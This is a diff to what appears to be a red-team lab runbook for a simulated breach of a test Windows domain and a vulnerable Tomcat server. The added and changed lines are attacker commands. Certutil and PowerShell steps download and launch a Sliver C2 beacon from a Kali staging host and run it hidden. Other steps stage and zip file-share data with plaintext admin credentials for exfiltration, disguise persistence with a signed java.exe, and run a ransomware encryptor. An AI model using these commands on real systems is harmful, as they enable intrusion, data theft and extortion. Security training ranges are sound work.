@@ -85,6 +85,7 @@ ATTACKER NETWORK  10.0.0.0/24  (Docker bridge: attacker_net)
 
 TARGET NETWORK  192.168.10.0/24  (Docker bridge: target_net + VirtualBox bridged NICs)
   10.0.0.100 / 192.168.10.100  dragonrx_web01  Tomcat 9.0.54 + log4j-core 2.14.1  :8080
+  10.0.0.5   / 192.168.10.5    dragonrx_kali   Dual-homed — attacker_net AND target_net
   192.168.10.10                DC01            Windows Server 2019 — novatech.local DC
   192.168.10.20                FS01            Windows Server 2019 — SMB file server
   192.168.10.50                WS01            Windows 10 22H2 — jsmith workstation
@@ -95,6 +96,10 @@ ROUTING: setup_routing.sh enables IP forwarding + iptables FORWARD between attac
 Kali at 10.0.0.5 can reach all hosts in 192.168.10.0/24 via this routing.
 
 WEB01 is dual-homed — reachable from Kali as 10.0.0.100:8080 AND from Windows VMs as 192.168.10.100:8080.
+
+STAGING SERVER NOTE: Kali's HTTP staging server (port 8900) binds 0.0.0.0 — available on BOTH NICs.
+  Linux targets (web01): wget http://10.0.0.5:8900/...         (attacker_net path)
+  Windows targets (DC01/FS01/WS01): certutil/IWR http://192.168.10.5:8900/...  (target_net path)
 ```
 
 **Credentials provisioned by Ansible (do NOT use these directly — discover them in-sim):**
@@ -1235,7 +1240,7 @@ ls -lh data.zip
 > net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!
 > robocopy Z:\ C:\Temp\archive\Research      /E /NFL /NDL /NC /NJS /NJH
 > robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH
-> certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
+> certutil.exe -urlcache -f http://192.168.10.5:8900/7za.exe C:\Temp\7za.exe
 > C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\
 > ```
 
@@ -1256,20 +1261,39 @@ dir C:\Temp\data.zip
 **What's happening:** Data is staged on DC01. We need a Sliver session on DC01 to download it.
 First, we deploy RxPhage on DC01 to get a C2 session there, then exfiltrate via the beacon.
 
-**Deploy RxPhage Windows loader on DC01:**
+**Prerequisite — verify the HTTPS listener is running before deploying the beacon:**
+```bash
+[C2]
+sliver > jobs
+# Must show an https listener on :443 — the beacon is compiled for HTTPS, not HTTP
+# If missing, start it:
+sliver > https --lhost 0.0.0.0 --lport 443
+# [*] Successfully started job #2
+```
+
+**Deploy RxPhage Windows beacon on DC01:**
 ```bash
 [DC01]
-# Download the Windows PE loader from Kali staging
-# rxphage_loader.dll runs as a standalone PE if renamed to rxphage.exe
-certutil.exe -urlcache -f http://10.0.0.5:8900/rxphage/rxphage.exe C:\Temp\rxphage.exe
+mkdir C:\Temp 2>nul
 
-# Start it (connects back to Sliver C2 at 10.0.0.10:443)
-start /b C:\Temp\rxphage.exe
+# Download the Windows PE beacon from Kali staging (192.168.10.5 = Kali's target_net NIC)
+# rxphage.exe is a Sliver HTTPS beacon compiled as a Windows PE — distinct from rxphage_loader.dll
+certutil.exe -urlcache -f http://192.168.10.5:8900/rxphage/rxphage.exe C:\Temp\rxphage.exe
+
+# Verify download succeeded before executing
+dir C:\Temp\rxphage.exe
+
+# Launch as a detached hidden process (Start-Process survives wmiexec session teardown;
+# "start /b" is unreliable under wmiexec — the child dies when cmd.exe exits)
+powershell -c "Start-Process -FilePath 'C:\Temp\rxphage.exe' -WindowStyle Hidden"
+
+# Confirm it's alive
+powershell -c "Get-Process rxphage -ErrorAction SilentlyContinue | Select-Object Id,CPU"
 ```
 
 ```bash
 [C2] — Sliver console
-sliver > sessions
+sliver > beacons
 # Should now show a DC01 session
 # ID  Name   Transport  RemoteAddress         Hostname  Username           OS/Arch
 # 1   WEB01  https      192.168.10.100:xxxxx  web01     root               linux/amd64
@@ -1390,7 +1414,7 @@ mkdir "C:\ProgramData\Oracle\Java\javapath"
 # Download a legitimate java.exe from Kali staging to act as the sideload host binary
 # (DC01 has no Java installed — we stage our own copy)
 # This binary is signed by Oracle, making the scheduled task look legitimate in process listings
-certutil.exe -urlcache -f http://10.0.0.5:8900/java.exe \
+certutil.exe -urlcache -f http://192.168.10.5:8900/java.exe \
   "C:\ProgramData\Oracle\Java\javapath\java.exe"
 
 # Verify the binary is valid (it should have an Oracle code-signing certificate)
@@ -1509,7 +1533,7 @@ echo "NovaTech Phase III Trial — Patient Cohort Alpha CONFIDENTIAL" > C:\Temp\
 echo "Proprietary Synthesis Formula v2.3 — RESTRICTED"             > C:\Temp\RansomTest\formula.xlsx
 
 # Stage and run the encryptor
-certutil.exe -urlcache -f http://10.0.0.5:8900/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
+certutil.exe -urlcache -f http://192.168.10.5:8900/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
 C:\Temp\rxphage_encrypt.exe --path C:\Temp\RansomTest\
 
 # View ransom note deployed by encryptor
